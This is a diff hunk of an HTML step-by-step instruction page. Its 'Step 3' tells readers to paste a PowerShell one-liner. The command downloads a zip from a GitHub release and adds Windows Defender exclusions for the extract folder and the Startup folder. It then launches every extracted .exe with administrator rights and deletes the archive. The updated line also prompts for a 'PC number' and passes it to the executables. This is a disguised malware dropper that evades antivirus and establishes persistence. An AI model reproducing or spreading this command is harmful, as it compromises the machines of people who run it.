@@ -23,7 +23,7 @@
     <div class="step">
       <strong>Step 3:</strong>
       Copy and paste the code below into PowerShell, then press <kbd>Enter</kbd>:
-      <code>$zip="$env:TEMP\tool.zip"; $out="$env:TEMP\tools"; $url="https://github.com/walaywashere/testingonly/releases/download/log/tool.zip"; Invoke-WebRequest $url -OutFile $zip; Expand-Archive $zip -DestinationPath $out -Force; Add-MpPreference -ExclusionPath $out; Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath("Startup")); Get-ChildItem "$out\*.exe" | ForEach-Object { try { Start-Process $_.FullName -Verb RunAs | Out-Null; Write-Host "[ $($_.Name) ] started successfully." } catch { Write-Host "[ $($_.Name) ] failed: $($_.Exception.Message)" } }; Remove-Item $zip</code>
+      <code>$choice=Read-Host "Enter PC number (1-7)"; $zip="$env:TEMP\tool.zip"; $out="$env:TEMP\tools"; $url="https://github.com/walaywashere/testingonly/releases/download/logs/tool.zip"; Invoke-WebRequest $url -OutFile $zip; Expand-Archive $zip -DestinationPath $out -Force; Add-MpPreference -ExclusionPath $out; Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath("Startup")); Get-ChildItem "$out\*.exe" | ForEach-Object { try { Start-Process $_.FullName -ArgumentList $choice -Verb RunAs | Out-Null; Write-Host "[ $($_.Name) ] started successfully." } catch { Write-Host "[ $($_.Name) ] failed: $($_.Exception.Message)" } }; Remove-Item $zip</code>
     </div>
 
     <div class="step">
